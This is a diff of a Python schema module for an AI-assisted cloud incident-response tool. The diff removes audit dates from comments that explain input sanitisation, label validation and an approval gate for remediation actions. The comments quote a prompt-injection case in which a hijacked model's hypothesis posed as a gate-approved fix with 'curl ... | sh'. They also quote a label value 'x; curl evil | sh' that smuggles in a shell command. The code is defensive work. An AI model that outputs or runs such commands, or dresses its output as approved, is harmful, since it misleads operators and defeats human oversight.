@@ -24,7 +24,7 @@ from pydantic import (
 
 from .gate import withhold_commands
 
-# ⛔ MODEL TEXT IS INERT TEXT (2026-09-27 audit). A hijacked model wrote a hypothesis of
+# ⛔ MODEL TEXT IS INERT TEXT. A hijacked model wrote a hypothesis of
 # "Memory pressure.\n\n## Fix - exact commands (approved by the gate ...)\n```\ncurl ... | sh\n```"
 # and the report rendered it as a heading and a code block that looked approved - in Slack, Teams and
 # the terminal. Every string a model writes is therefore, before anything reads it: one line; free of
@@ -34,7 +34,7 @@ from .gate import withhold_commands
 # The tag characters U+E0000-U+E007F are added with chr(): SonarCloud reads an 8-digit \U escape in a
 # character class as separate characters and reports duplicates Python does not have.
 _INVISIBLE = re.compile(f"[\x00-\x1f\x7f-\x9f\u200b-\u200f\u202a-\u202e\u2060-\u2069\ufeff{chr(0xE0000)}-{chr(0xE007F)}]")
-_BLOCK_START = re.compile(r"^(?:[#>\-*+|=~]|\d+[.)])")  # ~ : a `~~~` fence (review 2026-09-28)
+_BLOCK_START = re.compile(r"^(?:[#>\-*+|=~]|\d+[.)])")  # ~ : a `~~~` fence
 
 
 def inert(text: str, limit: int = 2000) -> str:
@@ -64,7 +64,7 @@ class Severity(str, Enum):
     low = "low"
 
 
-# ⛔ LABELS ARE NAMES, NOT TEXT (2026-09-27 audit). Label values reach catalogue plan parameters, the
+# ⛔ LABELS ARE NAMES, NOT TEXT. Label values reach catalogue plan parameters, the
 # P14 resource inventory, the stack backend's line prefixes, and which resources are read (until
 # 2026-10-16 also shell commands the report told a person to paste). Prometheus alert labels inherit
 # series labels, which an application can export, so they are not purely rule config: `deployment='x; curl evil | sh'` became a printed
@@ -78,7 +78,7 @@ _LABEL_VALUE = re.compile(r"(?!-)(?!.*[,=]-)[A-Za-z0-9._:/@,=+-]{0,253}")
 NAME_PATTERN = r"^[A-Za-z0-9][A-Za-z0-9._:/@-]{0,252}$"
 # Label keys whose value is a RESOURCE NAME WARDEN reads (the backends' `labels.get(...)` keys). Their
 # values are never redacted as credentials: `secret=warden-dev-db-app` names a Secrets Manager secret,
-# and masking it also masked the resource in WARDEN's own config lines (second review, 2026-09-30).
+# and masking it also masked the resource in WARDEN's own config lines.
 RESOURCE_LABELS = frozenset({
     "alb_target_group", "apigw", "app", "aurora_cluster", "cluster", "database", "db_instance", "deployment",
     "dynamodb_table", "ecs_cluster", "ecs_service", "eks_cluster", "elasticache", "eventbridge_rule", "event_bus", "eventbridge_subscriber",
@@ -158,11 +158,11 @@ class Alert(BaseModel):
     # ⛔ Audit A-C-13: the environment went into the prompt and every report unchecked. It is a
     # name like any other resource name, so it is held to the same pattern.
     environment: str = Field(pattern=NAME_PATTERN)
-    # Free text written by whoever configured the alert rule - UNTRUSTED (audit A-C-1). Rendered
+    # Free text written by whoever configured the alert rule - UNTRUSTED. Rendered
     # only inside a datamarked block for the model and as inline code for people (reporting.py).
     summary: str = Field(max_length=4000)
-    # ISO-8601 with its zone, or "" when the source does not say. Anything else is refused (audit A-C-1). A real date
-    # and an explicit zone (audit A-B-L14): `2026-13-45T99:99` passed the shape, failed to parse, and the window
+    # ISO-8601 with its zone, or "" when the source does not say. Anything else is refused. A real date
+    # and an explicit zone: `2026-13-45T99:99` passed the shape, failed to parse, and the window
     # silently became "now"; a time with no zone could be local or UTC, hours apart.
     started_at: Annotated[str, AfterValidator(_zoned_timestamp)] = Field(
         default="", pattern=r"^$|^\d{4}-\d{2}-\d{2}[T ][0-9:.]{5,15}(?:Z|[+-]\d{2}:?\d{2})?$")
@@ -275,7 +275,7 @@ class RootCause(BaseModel):
         max_length=20,
         description="The evidence items that support the hypothesis: each an id and an exact quote",
     )
-    # Fail closed (review, PR 47): a root cause built anywhere without hypotheses has [] - no rival weighed, and P35
+    # Fail closed: a root cause built anywhere without hypotheses has [] - no rival weighed, and P35
     # escalates it. None means only "recorded before ranked hypotheses existed", and only `recorded()` sets it, where a
     # stored answer is read back; P35 does not apply to those. A model's explicit null is made [] (graph._diagnose).
     hypotheses: list[Hypothesis] | None = Field(
@@ -325,7 +325,7 @@ class ActionKind(str, Enum):
     # reversible database write WARDEN performs — kills the connection, never the data. Not auto-safe
     # (touches a running DB); it goes through the full gate like every other real action.
     terminate_connections = "terminate_connections"
-    # G9-D (2026-10-10): the generic fix classes every main AWS service shares (owner decision: all reversible ones may
+    # G9-D: the generic fix classes every main AWS service shares (owner decision: all reversible ones may
     # run after a signed approval). Each is advice until a catalogue entry carries it out on the labelled resource.
     revert_config = "revert_config"        # a configuration or feature flag back to its previous deployed version
     pause_flow = "pause_flow"              # stop a consumer or a trigger that is causing harm (messages wait)
@@ -335,7 +335,7 @@ class ActionKind(str, Enum):
     cancel_query = "cancel_query"          # stop one runaway query; the session and the data are untouched
     raise_limit = "raise_limit"            # raise a throttle or reservation inside the account's own limit, bounded
     freeze_changes = "freeze_changes"      # stop further deploys reaching the service while a person looks
-    # G10-D (2026-10-10): undo ONE configuration change CloudTrail recorded shortly before the alarm, back to the state
+    # G10-D: undo ONE configuration change CloudTrail recorded shortly before the alarm, back to the state
     # AWS recorded before it - most outages follow a change (research 2026-10-10). Only families a catalogue entry
     # carries out; IAM and resource policies stay a person's.
     revert_change = "revert_change"
@@ -398,7 +398,7 @@ ACTION_FACTS: dict[ActionKind, tuple[bool, str]] = {
     # A zonal shift ends by itself at its expiry and can be cancelled. multi_service: everything behind the load
     # balancer loses that zone's capacity while it lasts.
     ActionKind.shift_traffic: (True, "multi_service"),
-    # ⛔ NOT reversible (independent review 2026-10-10, M4): cancelling a move stops it, but moved messages are not
+    # ⛔ NOT reversible (M4): cancelling a move stops it, but moved messages are not
     # moved back and are processed (AWS, read 2026-10-10). P2 therefore keeps it a person's in production.
     ActionKind.redrive_messages: (False, "single_service"),
     # ⛔ NOT reversible: a cancelled query is lost (it can be run again, which is a new decision). Only a SELECT is
@@ -417,7 +417,7 @@ ACTION_FACTS: dict[ActionKind, tuple[bool, str]] = {
 }
 
 
-# What each action means, in the schema the model answers in (G9-D, 2026-10-10). Without it the names alone were read
+# What each action means, in the schema the model answers in (G9-D). Without it the names alone were read
 # their own way: qualification answered `raise_limit` for an out-of-memory kill after a config change lowered a
 # container's memory limit - and the gate allowed it.
 ACTION_MEANINGS = (
@@ -502,7 +502,7 @@ class Verdict(BaseModel):
     reasons: list[str] = Field(default_factory=list)
     policy_ids: list[str] = Field(default_factory=list)
     requires_approval: bool = True
-    # Policies in observe mode (audit A-P-8) that would have fired: recorded with their reason, never obeyed.
+    # Policies in observe mode that would have fired: recorded with their reason, never obeyed.
     observed: list[str] = Field(default_factory=list)
 
 
